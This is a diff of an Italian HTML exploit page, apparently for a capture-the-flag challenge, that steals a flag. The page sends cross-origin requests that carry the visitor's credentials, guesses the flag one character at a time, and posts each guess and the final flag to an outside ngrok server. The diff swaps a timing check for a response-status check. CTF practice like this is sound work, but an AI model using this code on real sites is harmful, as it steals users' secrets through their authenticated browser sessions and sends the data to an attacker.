@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rubare Flag con Timing Attack</title>
+    <title>Rubare Flag</title>
 </head>
 <body>
     <h1>Rubare la Flag dell'Architetto</h1>
@@ -12,54 +12,57 @@
     const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[];:\'",.<>?/|\\';
     let currentFlag = 'flag{'; // Inizio della flag
     let position = 5; // Posizione successiva da testare
-    let logMessages = []; // Log per invio progressivo
 
-    const testChar = async (position) => {
-        if (position < 100) { 
+    const logProgress = (message) => {
+        fetch('https://bcc2-87-4-142-72.ngrok-free.app/log', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: `log=${encodeURIComponent(message)}`
+        });
+    };
+
+    const testChar = (position) => {
+        if (position < 100) { // Limite superiore
             for (let char of chars) {
                 const query = `${baseUrl}${currentFlag}${char}`;
-                const startTime = new Date().getTime();
-
-                // Effettua la richiesta senza attendere il risultato
                 fetch(query, {
                     method: 'GET',
                     credentials: 'include',
                     mode: 'no-cors'
-                });
-
-                // Misura il tempo di risposta
-                await new Promise(resolve => setTimeout(resolve, 500)); // Aspetta 500ms
-                const responseTime = new Date().getTime() - startTime;
-
-                // Analisi del timing
-                if (responseTime > 450) {  // Se supera il tempo base, assume che sia valido
-                    console.log(`Carattere trovato: ${char}`);
-                    logMessages.push(`Trovato carattere ${char} a posizione ${position}`);
-                    currentFlag += char;
-                    await testChar(currentFlag.length); // Passa alla posizione successiva
-                    return;
-                } else {
-                    console.log(`Carattere ${char} non valido per la posizione ${position}`);
-                }
+                })
+                .then(response => {
+                    if (response.ok) {
+                        logProgress(`Trovato carattere ${char} per la posizione ${position}`);
+                        console.log(`Trovato carattere ${char} per la posizione ${position}`);
+                        currentFlag += char; // Aggiungi carattere
+                        testChar(currentFlag.length); // Prossima posizione
+                        return; // Esci per evitare conflitti
+                    } else {
+                        logProgress(`Carattere ${char} non valido per la posizione ${position}`);
+                        console.log(`Carattere ${char} non valido per la posizione ${position}`);
+                    }
+                })
+                .catch(error => console.error('Errore:', error));
             }
         } else {
-            // Log della flag finale
-            console.log(`Flag trovata: ${currentFlag}`);
-            logMessages.push(`Flag completa: ${currentFlag}`);
+            console.log(`Flag completa: ${currentFlag}`);
+            // Invia la flag al tuo server Flask
             fetch('https://bcc2-87-4-142-72.ngrok-free.app/receive_flag', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
                 },
-                body: `flag=${encodeURIComponent(currentFlag)}&log=${encodeURIComponent(logMessages.join('\n'))}`
+                body: `flag=${encodeURIComponent(currentFlag)}`
             })
             .then(response => response.text())
-            .then(data => console.log('Risposta dal server:', data))
-            .catch(error => console.error('Errore durante l\'invio della flag:', error));
+            .then(data => console.log(data))
+            .catch(error => console.error('Errore:', error));
         }
     };
 
-    // Avvio
+    // Inizia il test
     testChar(position);
     </script>
 </body>
